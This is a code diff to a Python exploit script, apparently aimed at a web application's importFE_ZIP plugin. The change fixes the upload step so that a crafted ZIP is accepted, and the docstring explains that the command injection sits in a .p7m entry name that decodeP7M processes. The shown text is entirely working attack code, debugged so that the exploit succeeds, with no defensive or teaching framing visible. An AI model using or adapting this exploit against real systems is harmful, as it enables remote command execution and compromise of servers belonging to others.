@@ -445,16 +445,25 @@ def _zip_bytes(filename: str) -> bytes:
     return buf.getvalue()
 
 
-def _upload(opener, ctx, filename: str) -> bool:
-    mid, pid, action, op, field, extra = ctx
-    params = {"op": op, "id_module": mid, "id_plugin": pid}
+def _upload(opener, ctx, entry_name: str) -> bool:
+    """Upload the malicious ZIP to the importFE_ZIP save handler.
+
+    Per the plugin source (plugins/importFE_ZIP/actions.php `case 'save'`): the
+    file is read from $_FILES['blob1'] and the UPLOAD name must end in '.zip'
+    (string_ends_with($name,'.zip')) before it is extracted; the command
+    injection is the .p7m ENTRY name inside that zip, not the upload name. Sending
+    it as the discovered form field ('blob') with a .p7m upload name — as before —
+    was silently rejected, so decodeP7M never ran."""
+    mid, pid, action, op, _field, extra = ctx
+    params = {"op": "save", "id_module": mid, "id_plugin": pid}
     params.update(extra)
     url = action + ("&" if "?" in action else "?") + urllib.parse.urlencode(params)
-    body, ctype = _multipart(field, filename, _zip_bytes(filename))
+    body, ctype = _multipart("blob1", "scryer.zip", _zip_bytes(entry_name))
     try:
         req = urllib.request.Request(url, data=body,
-                                     headers={"Content-Type": ctype})
-        with opener.open(req, timeout=12) as resp:
+                                     headers={"Content-Type": ctype,
+                                              "X-Requested-With": "XMLHttpRequest"})
+        with opener.open(req, timeout=15) as resp:
             return resp.status < 500
     except urllib.error.HTTPError as exc:
         return exc.code < 500
